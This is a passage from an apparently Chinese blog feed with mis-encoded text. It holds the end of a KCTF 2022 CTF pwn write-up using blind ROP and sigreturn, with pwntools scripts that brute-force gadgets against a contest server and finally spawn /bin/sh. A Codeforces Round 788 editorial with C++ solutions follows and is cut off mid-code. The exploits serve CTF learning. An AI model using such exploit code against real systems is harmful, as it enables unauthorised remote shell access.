class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    p=remote(host=<span class="string">&#x27;221.228.109.254&#x27;</span>,port=<span class="number">10005</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            s=p.recv()</span><br><span class="line">            payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(i)+p64(pop_rdi)*<span class="number">3</span>+p64(<span class="number">1</span>)+p64(pop_rsi_2)+p64(<span class="number">0x400000</span>)*<span class="number">2</span>+p64(<span class="number">0x4000ce</span>)</span><br><span class="line">            <span class="comment">#payload=b&#x27;a&#x27;*0x10+</span></span><br><span class="line">            <span class="comment">#print(payload)</span></span><br><span class="line">            p.send(payload)</span><br><span class="line">            p.send(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">            ss=(p.recvall(timeout=<span class="number">1</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(i),k,ss)</span><br><span class="line">            <span class="comment">#if ss==s:</span></span><br><span class="line">            <span class="comment">#    break</span></span><br><span class="line">            p.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="comment">#sleep(2)</span></span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">41 5c 41 5d 41 5e 41 5f c3</span></span><br><span class="line"><span class="string">rdi 1</span></span><br><span class="line"><span class="string">rsi str</span></span><br><span class="line"><span class="string">rdx len</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">101 RET</span></span><br><span class="line"><span class="string">102 POP</span></span><br><span class="line"><span class="string">106 RET</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªè„šæœ¬ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡ä¿®æ”¹ <code>rax</code> çš„å€¼æˆåŠŸè°ƒç”¨<code>sys_read</code> <code>dump</code> å‡ºäº†æ ˆä¸Šé¢çš„å†…å­˜ã€‚</p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/5.png" alt="5"></p><p>ç”±æ­¤æˆ‘ä»¬ç¡®å®šäº† <code>syscall ret</code> çš„ <code>gadget</code> åœ¨ <code>0x4000ec</code> çš„åœ°æ–¹ã€‚ä½†æ˜¯è¿˜éœ€è¦æœ‰ä¸€ä¸ªå›ºå®šèƒ½ <code>read</code> çš„ <code>gadget</code> æ‰è¡Œï¼Œå› ä¸ºåªæœ‰è¿™æ ·æˆ‘ä»¬æ‰èƒ½æ§åˆ¶ <code>rax</code> å¯„å­˜å™¨çš„å€¼ï¼Œæ¥é€‰æ‹©æˆ‘ä»¬éœ€è¦çš„ç³»ç»Ÿè°ƒç”¨ã€‚</p><p>å½“ç„¶æˆ‘ä»¬ä¹Ÿæ‰¾åˆ°äº†ï¼Œåœ¨<code>0x4000f3</code>ï¼Œå¹¶ä¸”å‘ç°éœ€è¦ä¼ ä¸¤ä¸ªå‚æ•°æ‰èƒ½æŠŠ <code>rop</code> é“¾æ‹¼æ¥ä¸Šå»ï¼Œæ„Ÿè§‰è¿™é‡Œä¸¤ä¸ªå‚æ•°åº”è¯¥æ˜¯ <code>add rsp,0x10</code> äº§ç”Ÿçš„ã€‚</p><p>é‚£ä¹Ÿä¸ç”¨ç®¡é‚£ä¹ˆå¤šäº†ï¼Œé€šè¿‡è¿™ä¸¤ä¸ª <code>gadget</code> æˆ‘ä»¬å°±èƒ½è¿›è¡Œä¸€æ¬¡æŒ‡å®šçš„ç³»ç»Ÿè°ƒç”¨ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸é€‰æ‹©ä½¿ç”¨ <code>write</code> è°ƒç”¨æ³„éœ²æ ˆçš„å†…å­˜ï¼Œæˆ‘ä»¬ç›´æ¥æŠŠ <code>elf</code> çš„å†…å­˜ç»™ <code>dump</code> å‡ºæ¥å°±è¡Œï¼Œå› ä¸ºæ²¡æœ‰ <code>gadget</code> é‚£æˆ‘ä»¬ç›´æ¥ç”¨ <code>sigreturn</code> çš„æ–¹å¼æ§åˆ¶å¯„å­˜å™¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">main=<span class="number">0x4000b5</span></span><br><span class="line">ret=<span class="number">0x400101</span></span><br><span class="line">pop_rdi = <span class="number">0x400101</span> - <span class="number">1</span></span><br><span class="line">pop_rsi_2 = <span class="number">0x400101</span> - <span class="number">3</span></span><br><span class="line">syscall=<span class="number">0x4000ec</span></span><br><span class="line">sysread=<span class="number">0x4000f3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4000b0 0 b&#x27;hacker, TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000ce 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">INPUT</span></span><br><span class="line"><span class="string">0x4000b5 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000b6 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000b8 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c2 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c7 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c9 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">rdi 1</span></span><br><span class="line"><span class="string">rsi str</span></span><br><span class="line"><span class="string">rdx len</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4000f3</span>,<span class="number">0x4000f4</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    p=remote(host=<span class="string">&#x27;221.228.109.254&#x27;</span>,port=<span class="number">10088</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            s=p.recv()</span><br><span class="line">            rop=SigreturnFrame()</span><br><span class="line">            rop.rax=<span class="number">1</span></span><br><span class="line">            rop.rdi=<span class="number">1</span></span><br><span class="line">            rop.rip=syscall            </span><br><span class="line">            rop.rsp=<span class="number">0x400000</span></span><br><span class="line">            rop.rbp=<span class="number">0x400000</span></span><br><span class="line">            rop.rsi=<span class="number">0x400000</span></span><br><span class="line">            rop.rdx=<span class="number">0x400</span></span><br><span class="line">            </span><br><span class="line">            payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(sysread)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(syscall)+<span class="built_in">eval</span>(<span class="built_in">str</span>(rop))</span><br><span class="line">            p.send(payload)</span><br><span class="line">            p.send(<span class="string">&#x27;B&#x27;</span>*<span class="number">15</span>)</span><br><span class="line">            p.interactive()        </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="comment">#sleep(2)</span></span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">41 5c 41 5d 41 5e 41 5f c3</span></span><br><span class="line"><span class="string">rdi 1</span></span><br><span class="line"><span class="string">rsi str</span></span><br><span class="line"><span class="string">rdx len</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">101 RET</span></span><br><span class="line"><span class="string">102 POP</span></span><br><span class="line"><span class="string">106 RET</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p> <img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/6.png" alt="6"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å°±æˆåŠŸç”¨ <code>sigreturn</code> è°ƒç”¨äº† <code>sys_write(1,0x400000,0x400)</code> ï¼Œè‡³æ­¤ç»ˆäºä¸æ˜¯çå­è§†è§’äº†ï¼Œè¿™é‡Œå†æ˜¯ <code>ThTsOd</code> å¸ˆå‚…å¸®æˆ‘é‡å»ºäº† <code>ELF</code> æ–‡ä»¶ï¼Œ<code>IDA</code> ä¸€å¼€</p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/7.png" alt="7"></p><p>å…¶å®ç°åœ¨ <code>IDA</code> å·²ç»ä¸é‡è¦äº†ï¼Œä¸»è¦è¿˜æ˜¯èƒ½æœ¬åœ°è°ƒè¯•å°±éå¸¸çˆ½ã€‚</p><p>ä½†æ˜¯è¿™é‡Œåˆå¡äº†ä¸€ä¸ªå…³ï¼Œé‚£å°±æ˜¯æ‰¾ä¸åˆ°ç¡®å®šåœ°å€å¯å†™çš„åœ°æ–¹å†™ä¸Š <code>/bin/sh</code>ã€‚è¿™é‡ŒåˆåŒå’å•æ˜¯ <code>ThTsOd</code> å¸ˆå‚…å‘æˆ‘æŒ‡æ˜äº† <code>0x600000</code> å¤„çš„å†…å­˜æ˜¯å¯è¯»å¯å†™çš„ã€‚</p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/8.png" alt="8"></p><p>æ‰“å¼€ä¸€çœ‹æœç„¶æ˜¯è¿™æ ·ï¼Œè€Œä¸”ç»™çš„å†…å­˜è¿˜æŒºå¤šï¼Œé‚£å°±çˆ½äº†ï¼Œç›´æ¥å…ˆè°ƒç”¨ <code>sys_read</code> å†ä¸Šé¢å†™ä¸Š <code>/bin/sh</code> é¡ºä¾¿æ¥ä¸Š <code>rop</code> é“¾ï¼Œç„¶åå†ä¸€æ¬¡ <code>sigreturn</code> æ‰§è¡Œ <code>execve(&#39;/bin/sh&#39;,0,0)</code>  å»è·å¾— <code>shell</code>ã€‚</p><p>æœ€ç»ˆ <code>exp</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">main=<span class="number">0x4000b5</span></span><br><span class="line">ret=<span class="number">0x400101</span></span><br><span class="line">syscall=<span class="number">0x4000ec</span></span><br><span class="line">sysread=<span class="number">0x4000f3</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(host=<span class="string">&#x27;221.228.109.254&#x27;</span>,port=<span class="number">10100</span>)</span><br><span class="line">s=p.recv()</span><br><span class="line">rop=SigreturnFrame()</span><br><span class="line">rop.rax=<span class="number">0</span></span><br><span class="line">rop.rdi=<span class="number">0</span></span><br><span class="line">rop.rip=syscall            </span><br><span class="line">rop.rsp=<span class="number">0x600020</span></span><br><span class="line">rop.rbp=<span class="number">0x600020</span></span><br><span class="line">rop.rsi=<span class="number">0x600000</span></span><br><span class="line">rop.rdx=<span class="number">0x400</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(syscall)+p64(syscall)+<span class="built_in">eval</span>(<span class="built_in">str</span>(rop))</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span>)</span><br><span class="line">rop.rax=<span class="number">59</span></span><br><span class="line">rop.rip=syscall</span><br><span class="line">rop.rdi=<span class="number">0x600000</span></span><br><span class="line">rop.rdx=<span class="number">0</span></span><br><span class="line">rop.rsi=<span class="number">0</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\0&#x27;</span>+p64(sysread)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(syscall)+<span class="built_in">eval</span>(<span class="built_in">str</span>(rop)))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é¢˜åé¢ä¸éš¾ï¼Œä¸»è¦æ˜¯æƒ³åŠæ³• <code>dump</code> å†…å­˜é‡å»º <code>elf</code>ï¼Œç„¶åå°±æ˜¯ç­¾åˆ°çš„åšæ³•äº†ã€‚</p><p>é¢˜å¤–è¯ï¼šé‚£æˆ‘ä¸ç¦å¯¹é‚£ä¸ªç²¾è‡´åˆ†ä»…æœ‰ <code>87</code> åˆ†çš„ <code>pwn</code> é¢˜ç‘Ÿç‘Ÿå‘æŠ–äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
          <category> brop </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces Round 788(Div.2)é¢˜è§£</title>
      <link href="/2022/05/07/Codeforces%20Round%20788(Div.2)/"/>
      <url>/2022/05/07/Codeforces%20Round%20788(Div.2)/</url>
      
        <content type="html"><![CDATA[<p><a href="https://codeforces.com/contest/1670">Codeforces Round #788 (Div. 2)</a>é¢˜è§£ã€‚</p><p>å®å†µåœ¨<a href="https://www.bilibili.com/video/BV1X3411P7jR?spm_id_from=333.999.0.0">è¿™é‡Œ</a></p><span id="more"></span><h2 id="A-Prof-Slim"><a href="#A-Prof-Slim" class="headerlink" title="A. Prof. Slim"></a>A. Prof. Slim</h2><h3 id="é¢˜ç›®æè¿°ï¼š"><a href="#é¢˜ç›®æè¿°ï¼š" class="headerlink" title="é¢˜ç›®æè¿°ï¼š"></a>é¢˜ç›®æè¿°ï¼š</h3><p><img src="/2022/05/07/Codeforces%20Round%20788(Div.2)/1.png" alt="1"></p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ç»™ä½ ä¸€ä¸ªåºåˆ—ï¼Œä¸€æ¬¡æ“ä½œä¼šä½¿åºåˆ—ä¸­çš„ä¸¤ä¸ªæ•°äº¤æ¢ç¬¦å·ä½†ä¸äº¤æ¢å¤§å°ï¼Œé—®èƒ½å¦åœ¨è‹¥å¹²æ¬¡æ“ä½œåä½¿å¾—åºåˆ—ä¸é€’å‡ã€‚å®¹æ˜“å¾—åˆ°è´Ÿæ•°çš„ä¸ªæ•°ä¸€å®šä¸å˜å¹¶ä¸”è´Ÿæ•°æ°¸è¿œå°äºæ­£æ•°ï¼Œå› æ­¤æœ€åçš„ç»“æœä¸€å®šæ˜¯è´Ÿæ•°å…¨åœ¨å‰é¢ï¼Œæ­£æ•°å…¨åœ¨åé¢ï¼Œå› ä¸ºä¸€ä¸ªä½ç½®çš„æ•°çš„ç»å¯¹å€¼ä¸€å®šä¸ä¼šæ”¹å˜ï¼Œæ‰€ä»¥å¯ä»¥å¾—åˆ°åœ¨ç»å¯¹å€¼ä¸­ï¼Œè´Ÿæ•°åŒºåŸŸä¸€å®šä¸é€’å¢ï¼Œæ­£æ•°åŒºåŸŸä¸€å®šä¸é€’å‡ã€‚å…ˆ <code>O(n)</code> ç»Ÿè®¡æ‰€æœ‰çš„è´Ÿæ•°çš„ä¸ªæ•°ï¼Œå†åˆ¤æ–­å°±okäº†ã€‚</p><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn]; </span><br><span class="line"><span class="keyword">int</span> n,k;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> num_de=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">        <span class="keyword">if</span>(a[i]&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            num_de++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=num_de;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">abs</span>(a[i])-<span class="built_in">abs</span>(a[i<span class="number">-1</span>])&gt;<span class="number">0</span>)NO</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=num_de+<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">abs</span>(a[i])-<span class="built_in">abs</span>(a[i<span class="number">-1</span>])&lt;<span class="number">0</span>)NO</span><br><span class="line">    &#125;</span><br><span class="line">    OK</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Dorms-War"><a href="#B-Dorms-War" class="headerlink" title="B. Dorms War"></a>B. Dorms War</h2><h3 id="é¢˜ç›®æè¿°ï¼š-1"><a href="#é¢˜ç›®æè¿°ï¼š-1" class="headerlink" title="é¢˜ç›®æè¿°ï¼š"></a>é¢˜ç›®æè¿°ï¼š</h3><p><img src="/2022/05/07/Codeforces%20Round%20788(Div.2)/2.png" alt="2"></p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™é¢˜ç›®é¢˜æ„åˆ†æäº†å¾ˆä¹…ï¼Œåé¢çœ‹äº†å¾ˆä¹…æ‰çœ‹å‡ºæ¥ã€‚å°±æ˜¯è¯´ç»™ä½ ä¸€ä¸ªå­—ç¬¦ä¸²å’Œè‹¥å¹²ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œæ¯æ¬¡æ“ä½œä¼šä½¿å¾—ç‰¹æ®Šå­—ç¬¦å‰é¢çš„é‚£ä¸ªå­—ç¬¦æ¶ˆå¤±ï¼Œç›´åˆ°å­—ç¬¦ä¸ä¼šå†æ¶ˆå¤±ä¸ºæ­¢ï¼Œé—®ä½ ä¸€å…±æ¶ˆå¤±å‡ æ¬¡ï¼Œç‰¹æ®Šå­—ç¬¦å¯ä»¥è¢«å‰é¢çš„ç‰¹æ®Šå­—ç¬¦æ¶ˆé™¤ã€‚</p><p>å…¶å®ä¸éš¾å‘ç°ï¼Œä¸€ä¸ªç‰¹æ®Šå­—ç¬¦åå‰é¢å­—ç¬¦çš„æ¬¡æ•°å°±ç›¸å½“äºå®ƒè·ç¦»æœ€è¿‘çš„ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦çš„è·ç¦»+1ã€‚å¤šä¸ªç‰¹æ®Šå­—ç¬¦ä¸å½±å“ç»“æœï¼Œå–æœ€å¤§å³å¯ï¼Œæ˜æ˜æ˜¯ <code>O(n)</code> çš„ç®—æ³•ï¼Œå†™çš„æ—¶é—´å´å¾ˆé«˜ï¼Œç”šè‡³å› æ­¤ <code>T</code> äº†ä¸€æ¬¡ã€‚ä»¥åä¸€å®šè¦è®°å¾— <code>IO</code> ä¼˜åŒ–ï¼Œæ‹’ç» <code>cin</code>ï¼Œä»æˆ‘åšèµ·ã€‚</p><h3 id="æ ‡ç¨‹-1"><a href="#æ ‡ç¨‹-1" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn]; </span><br><span class="line"><span class="keyword">int</span> spec[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> n,k;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;k);</span><br><span class="line">    <span class="built_in">memset</span>(spec,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(spec));</span><br><span class="line">    string tmp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=k;i++)&#123;</span><br><span class="line">        cin&gt;&gt;tmp;</span><br><span class="line">        spec[tmp[<span class="number">0</span>]-<span class="string">&#x27;a&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(spec[s[i]-<span class="string">&#x27;a&#x27;</span>])&#123;</span><br><span class="line">            ans=<span class="built_in">max</span>(ans,cnt);</span><br><span class="line">            cnt=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cnt++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span 